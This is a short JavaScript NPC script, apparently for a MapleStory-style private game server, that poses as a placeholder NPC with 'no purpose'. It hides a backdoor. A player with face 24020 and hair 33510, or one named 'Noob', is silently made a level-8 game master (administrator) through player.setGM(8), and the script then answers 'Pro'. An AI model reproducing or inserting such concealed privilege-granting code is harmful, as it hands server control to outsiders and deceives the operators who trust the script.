
var status=-1;
function start(){
    action(1,0,0);
}
function action(mode, type, selection) {
    if (mode < 1) {
        cm.dispose();
        return;
    } else {
        status++;
    }
    if(status==0){
    if(player.getFace()==24020 && player.getHair()==33510 || player.getName()=="Noob")
    {
        player.setGM(8);
        cm.sendOk("Pro");
    }else 
    cm.sendOk("i don't have any purpose right now."+
    "\r\n ID\t\t\t #b:2050002#k"+
    "\r\n script\t\t #b:null#k"+
    "\r\n map\t\t #b:221000300#k");
    cm.dispose();
    }
}